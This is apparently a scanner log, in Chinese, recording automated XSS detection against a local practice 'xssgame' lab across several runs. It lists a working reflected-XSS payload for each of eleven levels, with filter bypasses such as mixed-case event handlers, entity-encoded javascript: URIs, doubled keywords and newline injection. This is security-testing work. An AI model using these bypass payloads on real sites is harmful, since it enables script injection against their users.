+[32m[2020-04-24 16:03:49,467] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,514] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,543] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,549] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22onClIck%3D%22alert%281%29[0m
+[32m[2020-04-24 16:03:49,570] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,601] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,694] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,720] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3Bav%26%23x61%3B%26%23x73%3Bcr%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aaler%26%23x74%3B%281%26%23x29%3B[0m
+[32m[2020-04-24 16:03:49,732] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,760] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,813] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,834] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22onCliCk%3D%22alert%281%29[0m
+[32m[2020-04-24 16:03:49,856] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:03:49,881] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:49,938] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:49,955] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclonclickick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:03:49,975] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:03:50,016] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:50,048] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:50,067] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=java%26%23x73%3B%26%23x63%3Bri%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3Ber%26%23x74%3B%281%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:03:50,090] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:03:50,121] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:50,148] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:50,166] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-24 16:03:50,188] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:03:50,212] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:50,257] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:50,273] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-24 16:03:50,318] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-04-24 16:03:50,338] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:50,359] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-24 16:03:50,368] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:03:50,378] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:03:50,417] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:03:50,455] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-24 16:12:43,728] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:12:43,765] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:12:43,779] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:43,793] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:43,794] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onloAD%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-24 16:12:43,836] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:12:43,860] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:43,916] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:43,917] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22oNclicK%3D%22alert%281%29[0m
+[32m[2020-04-24 16:12:43,937] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:12:43,951] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:43,997] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:43,999] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27oNclicK%3D%27alert%281%29[0m
+[32m[2020-04-24 16:12:44,027] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:12:44,045] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,078] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,079] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22oncLicK%3D%22alert%281%29[0m
+[32m[2020-04-24 16:12:44,102] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:12:44,128] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,155] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,159] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3Bvas%26%23x63%3Brip%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3Bt%26%23x28%3B%26%23x31%3B%26%23x29%3B[0m
+[32m[2020-04-24 16:12:44,175] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:12:44,188] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,209] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,210] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oNclicK%3D%22alert%281%29[0m
+[32m[2020-04-24 16:12:44,232] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:12:44,242] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,289] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,290] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:12:44,314] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:12:44,341] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,364] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,365] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3B%26%23x61%3B%26%23x76%3Bas%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%26%23x3a%3B%26%23x61%3B%26%23x6c%3Be%26%23x72%3B%26%23x74%3B%28%26%23x31%3B%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:12:44,402] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:12:44,452] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,471] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,489] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-24 16:12:44,544] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:12:44,593] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,663] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,673] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-24 16:12:44,698] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-04-24 16:12:44,748] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,781] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-24 16:12:44,797] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:12:44,847] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:12:44,913] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:12:44,927] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-24 16:14:04,436] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-24 16:14:04,463] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-24 16:14:04,494] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:04,514] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:04,534] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onloAD%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-24 16:14:04,556] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-24 16:14:04,583] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:04,623] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:04,633] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22onCLick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:14:04,646] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-24 16:14:04,680] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:04,733] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:04,735] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27onclIcK%3D%27alert%281%29[0m
+[32m[2020-04-24 16:14:04,748] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-24 16:14:04,784] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:04,848] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:04,850] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22OncLick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:14:04,871] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-24 16:14:04,907] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:06,742] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:06,743] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3Ba%26%23x76%3B%26%23x61%3B%26%23x73%3Bcr%26%23x69%3Bpt%26%23x3a%3Bale%26%23x72%3Bt%26%23x28%3B%26%23x31%3B%29[0m
+[32m[2020-04-24 16:14:06,783] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-24 16:14:06,792] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:06,837] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:06,853] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oncLiCk%3D%22alert%281%29[0m
+[32m[2020-04-24 16:14:06,866] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-24 16:14:06,876] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:06,930] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:06,937] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-24 16:14:06,967] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:14:06,995] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:07,038] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:07,050] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3Ba%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3Bt%26%23x3a%3Ba%26%23x6c%3Bert%28%26%23x31%3B%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-24 16:14:07,074] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-24 16:14:07,117] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:07,134] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:07,150] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-24 16:14:07,163] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-24 16:14:07,195] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:07,243] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:07,254] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-24 16:14:07,266] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-04-24 16:14:07,306] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:07,323] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-24 16:14:07,370] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-24 16:14:07,415] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-24 16:14:07,466] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-24 16:14:07,485] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-26 17:40:13,171] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-26 17:40:13,311] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-04-26 17:40:13,361] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:13,408] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:13,410] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20oNloAd%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-26 17:40:13,510] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-04-26 17:40:13,553] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:13,653] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:13,667] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22OnclicK%3D%22alert%281%29[0m
+[32m[2020-04-26 17:40:13,720] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-04-26 17:40:13,769] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:13,874] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:13,875] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27oncLIck%3D%27alert%281%29[0m
+[32m[2020-04-26 17:40:13,940] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level4.php?keyword=2[0m
+[32m[2020-04-26 17:40:13,977] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:14,062] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:14,064] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22onCliCk%3D%22alert%281%29[0m
+[32m[2020-04-26 17:40:14,110] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level5.php?keyword=2[0m
+[32m[2020-04-26 17:40:14,150] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:14,269] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:14,270] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22java%26%23x73%3B%26%23x63%3Bript%3A%26%23x61%3Ble%26%23x72%3B%26%23x74%3B%281%26%23x29%3B[0m
+[32m[2020-04-26 17:40:14,337] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level6.php?keyword=2[0m
+[32m[2020-04-26 17:40:14,374] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:14,457] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:14,459] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22OncliCk%3D%22alert%281%29[0m
+[32m[2020-04-26 17:40:14,526] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level7.php?keyword=2[0m
+[32m[2020-04-26 17:40:14,574] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:14,705] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:14,732] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclonclickick%3D%22alert%281%29[0m
+[32m[2020-04-26 17:40:14,806] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-26 17:40:14,845] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:14,886] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:14,887] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level8.php?keyword=j%26%23x61%3Bva%26%23x73%3Bcri%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3Bert%281%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-26 17:40:14,965] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9.php?name=2[0m
+[32m[2020-04-26 17:40:15,013] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:15,081] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:15,083] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-26 17:40:15,137] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level9a.php?name=2[0m
+[32m[2020-04-26 17:40:15,195] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:15,261] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:15,263] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-26 17:40:15,355] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level10.php?name=2[0m
+[36m[2020-04-26 17:40:15,471] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:15,473] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level10.php?name=2&t_sort=%22%3E%3Cimg%20sRc%3D1%20onERRor%3D%22alert%281%29[0m
+[32m[2020-04-26 17:40:15,525] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level11.php?name=2[0m
+[32m[2020-04-26 17:40:15,572] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-04-26 17:40:15,630] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-04-26 17:40:15,631] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-05-06 20:53:23,014] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:53:23,040] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1[0m
+[32m[2020-05-06 20:53:23,057] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:53:23,087] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:53:23,090] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onLOad%3Dalert%281%29%3E[0m
+[32m[2020-05-06 20:54:50,735] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:50,763] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level1.php?name=1&x=2[0m
+[32m[2020-05-06 20:54:50,775] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:50,796] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:50,802] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20ONload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-05-06 20:54:50,804] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:50,935] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level2.php?keyword=2[0m
+[32m[2020-05-06 20:54:50,959] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:51,024] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:51,025] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22onclIcK%3D%22alert%281%29[0m
+[32m[2020-05-06 20:54:51,027] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-05-06 20:54:51,059] [log.py:90] [log:__console] [INFO]- 正在检测url:http://192.168.45.1/xss/xssgame/level3.php?keyword=2[0m
+[32m[2020-05-06 20:54:51,080] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[36m[2020-05-06 20:54:51,124] [log.py:92] [log:__console] [DEBUG]- 检测出xss_payload:[0m
+[36m[2020-05-06 20:54:51,126] [log.py:92] [log:__console] [DEBUG]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27OncLick%3D%27alert%281%29[0m
